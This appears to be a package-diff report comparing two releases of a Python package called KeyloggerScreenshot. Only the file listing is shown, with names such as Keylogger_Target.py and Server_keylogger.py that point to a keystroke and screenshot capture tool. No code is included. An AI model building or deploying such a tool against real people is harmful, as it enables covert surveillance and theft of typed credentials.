# Comparing `tmp/KeyloggerScreenshot-0.2.9.tar.gz` & `tmp/KeyloggerScreenshot-0.2.9.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "KeyloggerScreenshot-0.2.9.tar", last modified: Mon Apr  3 20:48:42 2023, max compression
+gzip compressed data, was "KeyloggerScreenshot-0.2.9.1.tar", last modified: Fri Apr 14 22:51:02 2023, max compression
```

## Comparing `KeyloggerScreenshot-0.2.9.tar` & `KeyloggerScreenshot-0.2.9.1.tar`

### file list

```diff
@@ -1,1174 +1,32 @@
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:41.998357 KeyloggerScreenshot-0.2.9/
--rw-rw-rw-   0        0        0     3197 2023-04-03 20:48:03.000000 KeyloggerScreenshot-0.2.9/CHANGELOG.txt
--rw-rw-rw-   0        0        0    11292 2023-04-03 20:31:09.000000 KeyloggerScreenshot-0.2.9/KLS_start.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:30.372209 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/
--rw-rw-rw-   0        0        0    11150 2023-03-20 12:27:58.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Keylogger_Target.py
--rw-rw-rw-   0        0        0     1744 2023-04-03 20:48:03.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Port_data.py
--rw-rw-rw-   0        0        0     5750 2023-04-03 20:03:58.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Server_keylogger.py
--rw-rw-rw-   0        0        0     2579 2023-03-31 11:18:55.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Server_listener.py
--rw-rw-rw-   0        0        0     3889 2023-03-31 11:18:55.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Server_photos.py
--rw-rw-rw-   0        0        0     1728 2023-03-31 11:18:55.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Server_timer.py
--rw-rw-rw-   0        0        0     3870 2023-04-03 19:41:30.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/Simulation_code.py
--rw-rw-rw-   0        0        0      295 2023-04-03 19:41:59.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:30.418115 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot.egg-info/
--rw-rw-rw-   0        0        0     9095 2023-04-03 20:48:29.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0    56119 2023-04-03 20:48:29.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-03 20:48:29.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       47 2023-04-03 20:48:29.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot.egg-info/requires.txt
--rw-rw-rw-   0        0        0       20 2023-04-03 20:48:29.000000 KeyloggerScreenshot-0.2.9/KeyloggerScreenshot.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.2.9/LISCENCE.txt
--rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.2.9/MANIFEST.in
--rw-rw-rw-   0        0        0     9095 2023-04-03 20:48:41.998357 KeyloggerScreenshot-0.2.9/PKG-INFO
--rw-rw-rw-   0        0        0     5137 2023-04-03 20:48:03.000000 KeyloggerScreenshot-0.2.9/README.md
--rw-rw-rw-   0        0        0      388 2023-03-04 16:59:26.000000 KeyloggerScreenshot-0.2.9/client.py
--rw-rw-rw-   0        0        0      660 2023-04-03 19:59:00.000000 KeyloggerScreenshot-0.2.9/demon_server.py
--rw-rw-rw-   0        0        0    39374 2023-03-14 06:49:49.000000 KeyloggerScreenshot-0.2.9/img_1.png
--rw-rw-rw-   0        0        0      923 2023-03-28 06:01:03.000000 KeyloggerScreenshot-0.2.9/leo_gui.py
--rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.2.9/requirements.py
--rw-rw-rw-   0        0        0       42 2023-04-03 20:48:41.998357 KeyloggerScreenshot-0.2.9/setup.cfg
--rw-rw-rw-   0        0        0     1075 2023-04-03 20:48:03.000000 KeyloggerScreenshot-0.2.9/setup.py
--rw-rw-rw-   0        0        0      381 2023-04-03 20:31:51.000000 KeyloggerScreenshot-0.2.9/target.py
--rw-rw-rw-   0        0        0      366 2023-04-03 20:31:09.000000 KeyloggerScreenshot-0.2.9/test.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:30.247934 KeyloggerScreenshot-0.2.9/venv/
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:30.128293 KeyloggerScreenshot-0.2.9/venv/Lib/
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:30.438478 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:30.531165 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting/
--rw-rw-rw-   0        0        0      136 2023-03-16 07:27:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting/__init__.py
--rw-rw-rw-   0        0        0      821 2023-03-16 07:27:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting/_main.py
--rw-rw-rw-   0        0        0      680 2023-03-16 07:27:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting/color.py
--rw-rw-rw-   0        0        0      865 2023-03-16 07:27:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting/color_list.py
--rw-rw-rw-   0        0        0     3960 2023-03-16 07:27:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting/draw.py
--rw-rw-rw-   0        0        0      897 2023-03-16 07:27:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting/rand.py
--rw-rw-rw-   0        0        0     4351 2023-03-16 07:27:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting/system.py
--rw-rw-rw-   0        0        0     4430 2023-03-16 07:27:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting/ui.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:30.548193 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting-0.7.1.dist-info/
--rw-rw-rw-   0        0        0     1055 2023-03-16 07:27:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting-0.7.1.dist-info/LICENCE.txt
--rw-rw-rw-   0        0        0       15 2023-03-16 07:27:06.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/BetterPrinting-0.7.1.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:30.618207 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/KeyloggerScreenshot/
--rw-rw-rw-   0        0        0    10959 2023-03-18 15:33:44.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/KeyloggerScreenshot/Keylogger_Target.py
--rw-rw-rw-   0        0        0    10251 2023-03-28 06:30:39.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/KeyloggerScreenshot/Server_keylogger.py
--rw-rw-rw-   0        0        0     2300 2023-03-18 15:33:44.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/KeyloggerScreenshot/Server_listener.py
--rw-rw-rw-   0        0        0     3671 2023-03-18 15:33:44.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/KeyloggerScreenshot/Server_photos.py
--rw-rw-rw-   0        0        0     1363 2023-03-18 15:33:44.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/KeyloggerScreenshot/Server_timer.py
--rw-rw-rw-   0        0        0      207 2023-03-18 15:33:44.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/KeyloggerScreenshot/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:30.628186 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/KeyloggerScreenshot-0.2.7.2.dist-info/
--rw-rw-rw-   0        0        0       20 2023-03-18 15:33:44.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/KeyloggerScreenshot-0.2.7.2.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:30.628186 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/MouseInfo-0.1.3.dist-info/
--rw-rw-rw-   0        0        0       10 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/MouseInfo-0.1.3.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:31.768380 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/
--rw-rw-rw-   0        0        0     2950 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/BdfFontFile.py
--rw-rw-rw-   0        0        0    16483 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/BlpImagePlugin.py
--rw-rw-rw-   0        0        0    18142 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/BmpImagePlugin.py
--rw-rw-rw-   0        0        0     1633 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/BufrStubImagePlugin.py
--rw-rw-rw-   0        0        0     3003 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ContainerIO.py
--rw-rw-rw-   0        0        0     1800 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/CurImagePlugin.py
--rw-rw-rw-   0        0        0     2041 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/DcxImagePlugin.py
--rw-rw-rw-   0        0        0     9637 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/DdsImagePlugin.py
--rw-rw-rw-   0        0        0    12682 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/EpsImagePlugin.py
--rw-rw-rw-   0        0        0    10098 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ExifTags.py
--rw-rw-rw-   0        0        0     2119 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/FitsImagePlugin.py
--rw-rw-rw-   0        0        0     1751 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/FitsStubImagePlugin.py
--rw-rw-rw-   0        0        0     4618 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/FliImagePlugin.py
--rw-rw-rw-   0        0        0     2876 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/FontFile.py
--rw-rw-rw-   0        0        0     7061 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/FpxImagePlugin.py
--rw-rw-rw-   0        0        0     3980 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/FtexImagePlugin.py
--rw-rw-rw-   0        0        0     3012 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/GbrImagePlugin.py
--rw-rw-rw-   0        0        0     2706 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/GdImageFile.py
--rw-rw-rw-   0        0        0    36816 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/GifImagePlugin.py
--rw-rw-rw-   0        0        0     3543 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/GimpGradientFile.py
--rw-rw-rw-   0        0        0     1407 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/GimpPaletteFile.py
--rw-rw-rw-   0        0        0     1627 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/GribStubImagePlugin.py
--rw-rw-rw-   0        0        0     1630 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/Hdf5StubImagePlugin.py
--rw-rw-rw-   0        0        0    12333 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/IcnsImagePlugin.py
--rw-rw-rw-   0        0        0    11982 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/IcoImagePlugin.py
--rw-rw-rw-   0        0        0    11252 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImImagePlugin.py
--rw-rw-rw-   0        0        0   135691 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/Image.py
--rw-rw-rw-   0        0        0     7657 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageChops.py
--rw-rw-rw-   0        0        0    38772 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageCms.py
--rw-rw-rw-   0        0        0     9097 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageColor.py
--rw-rw-rw-   0        0        0    38328 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageDraw.py
--rw-rw-rw-   0        0        0     6210 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageDraw2.py
--rw-rw-rw-   0        0        0     3293 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageEnhance.py
--rw-rw-rw-   0        0        0    24275 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageFile.py
--rw-rw-rw-   0        0        0    16919 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageFilter.py
--rw-rw-rw-   0        0        0    51833 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageFont.py
--rw-rw-rw-   0        0        0     4834 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageGrab.py
--rw-rw-rw-   0        0        0     7620 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageMath.py
--rw-rw-rw-   0        0        0     3097 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageMode.py
--rw-rw-rw-   0        0        0     8231 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageMorph.py
--rw-rw-rw-   0        0        0    21464 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageOps.py
--rw-rw-rw-   0        0        0     8425 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImagePalette.py
--rw-rw-rw-   0        0        0      355 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImagePath.py
--rw-rw-rw-   0        0        0     7119 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageQt.py
--rw-rw-rw-   0        0        0     1948 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageSequence.py
--rw-rw-rw-   0        0        0    11815 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageShow.py
--rw-rw-rw-   0        0        0     4072 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageStat.py
--rw-rw-rw-   0        0        0     8992 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageTk.py
--rw-rw-rw-   0        0        0     2985 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageTransform.py
--rw-rw-rw-   0        0        0     7421 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImageWin.py
--rw-rw-rw-   0        0        0     2690 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/ImtImagePlugin.py
--rw-rw-rw-   0        0        0     6013 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/IptcImagePlugin.py
--rw-rw-rw-   0        0        0    10995 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/Jpeg2KImagePlugin.py
--rw-rw-rw-   0        0        0    29895 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/JpegImagePlugin.py
--rw-rw-rw-   0        0        0    12583 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/JpegPresets.py
--rw-rw-rw-   0        0        0     1875 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/McIdasImagePlugin.py
--rw-rw-rw-   0        0        0     2540 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/MicImagePlugin.py
--rw-rw-rw-   0        0        0     1909 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/MpegImagePlugin.py
--rw-rw-rw-   0        0        0     6488 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/MpoImagePlugin.py
--rw-rw-rw-   0        0        0     5814 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/MspImagePlugin.py
--rw-rw-rw-   0        0        0     6754 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PSDraw.py
--rw-rw-rw-   0        0        0     1185 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PaletteFile.py
--rw-rw-rw-   0        0        0     9377 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PalmImagePlugin.py
--rw-rw-rw-   0        0        0     1562 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PcdImagePlugin.py
--rw-rw-rw-   0        0        0     6655 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PcfFontFile.py
--rw-rw-rw-   0        0        0     6248 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PcxImagePlugin.py
--rw-rw-rw-   0        0        0     8821 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PdfImagePlugin.py
--rw-rw-rw-   0        0        0    35628 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PdfParser.py
--rw-rw-rw-   0        0        0     1724 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PixarImagePlugin.py
--rw-rw-rw-   0        0        0    48003 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PngImagePlugin.py
--rw-rw-rw-   0        0        0    11712 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PpmImagePlugin.py
--rw-rw-rw-   0        0        0     7857 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PsdImagePlugin.py
--rw-rw-rw-   0        0        0    10159 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/PyAccess.py
--rw-rw-rw-   0        0        0     6413 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/SgiImagePlugin.py
--rw-rw-rw-   0        0        0     9794 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/SpiderImagePlugin.py
--rw-rw-rw-   0        0        0     4541 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/SunImagePlugin.py
--rw-rw-rw-   0        0        0     1559 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/TarIO.py
--rw-rw-rw-   0        0        0     6836 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/TgaImagePlugin.py
--rw-rw-rw-   0        0        0    78805 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/TiffImagePlugin.py
--rw-rw-rw-   0        0        0    17327 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/TiffTags.py
--rw-rw-rw-   0        0        0     5644 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/WalImageFile.py
--rw-rw-rw-   0        0        0    11720 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/WebPImagePlugin.py
--rw-rw-rw-   0        0        0     4871 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/WmfImagePlugin.py
--rw-rw-rw-   0        0        0     2068 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/XVThumbImagePlugin.py
--rw-rw-rw-   0        0        0     2587 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/XbmImagePlugin.py
--rw-rw-rw-   0        0        0     3326 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/XpmImagePlugin.py
--rw-rw-rw-   0        0        0     1843 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/__init__.py
--rw-rw-rw-   0        0        0       44 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/__main__.py
--rw-rw-rw-   0        0        0     2145 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/_binary.py
--rw-rw-rw-   0        0        0     1997 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/_deprecate.py
--rw-rw-rw-   0        0        0      691 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/_tkinter_finder.py
--rw-rw-rw-   0        0        0      388 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/_util.py
--rw-rw-rw-   0        0        0       52 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/_version.py
--rw-rw-rw-   0        0        0     9764 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PIL/features.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:31.768380 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/Pillow-9.4.0.dist-info/
--rw-rw-rw-   0        0        0        4 2023-03-16 07:27:09.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/Pillow-9.4.0.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:31.788160 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyAudio-0.2.13.dist-info/
--rw-rw-rw-   0        0        0     1055 2023-03-16 07:27:03.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyAudio-0.2.13.dist-info/LICENSE.txt
--rw-rw-rw-   0        0        0        8 2023-03-16 07:27:03.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyAudio-0.2.13.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:31.825467 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyAutoGUI-0.9.53.dist-info/
--rw-rw-rw-   0        0        0     2879 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyAutoGUI-0.9.53.dist-info/AUTHORS.txt
--rw-rw-rw-   0        0        0     1509 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyAutoGUI-0.9.53.dist-info/LICENSE.txt
--rw-rw-rw-   0        0        0       10 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyAutoGUI-0.9.53.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:31.833035 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyGetWindow-0.0.9.dist-info/
--rw-rw-rw-   0        0        0       12 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyGetWindow-0.0.9.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:31.841958 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyMsgBox-1.0.9.dist-info/
--rw-rw-rw-   0        0        0        9 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyMsgBox-1.0.9.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:31.868400 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyRect-0.2.0.dist-info/
--rw-rw-rw-   0        0        0      268 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyRect-0.2.0.dist-info/AUTHORS.txt
--rw-rw-rw-   0        0        0     1511 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyRect-0.2.0.dist-info/LICENSE.txt
--rw-rw-rw-   0        0        0        7 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyRect-0.2.0.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:31.898124 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyScreeze-0.1.28.dist-info/
--rw-rw-rw-   0        0        0      962 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyScreeze-0.1.28.dist-info/AUTHORS.txt
--rw-rw-rw-   0        0        0     1505 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyScreeze-0.1.28.dist-info/LICENSE.txt
--rw-rw-rw-   0        0        0       10 2023-03-16 07:27:00.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/PyScreeze-0.1.28.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:31.918295 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/_distutils_hack/
--rw-rw-rw-   0        0        0     6128 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/_distutils_hack/__init__.py
--rw-rw-rw-   0        0        0       44 2023-03-16 07:26:08.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/_distutils_hack/override.py
--rw-rw-rw-   0        0        0     5770 2023-03-16 07:26:04.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/_virtualenv.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:31.948013 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/certifi/
--rw-rw-rw-   0        0        0       94 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/certifi/__init__.py
--rw-rw-rw-   0        0        0      243 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/certifi/__main__.py
--rw-rw-rw-   0        0        0     4219 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/certifi/core.py
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:31.958172 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/certifi-2022.12.7.dist-info/
--rw-rw-rw-   0        0        0        8 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/certifi-2022.12.7.dist-info/top_level.txt
-drwxrwxrwx   0        0        0        0 2023-04-03 20:48:32.068005 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/
--rw-rw-rw-   0        0        0     1594 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/__init__.py
--rw-rw-rw-   0        0        0    19178 2023-03-16 07:29:55.000000 KeyloggerScreenshot-0.2.9/venv/Lib/site-packages/charset_normalizer/api.py
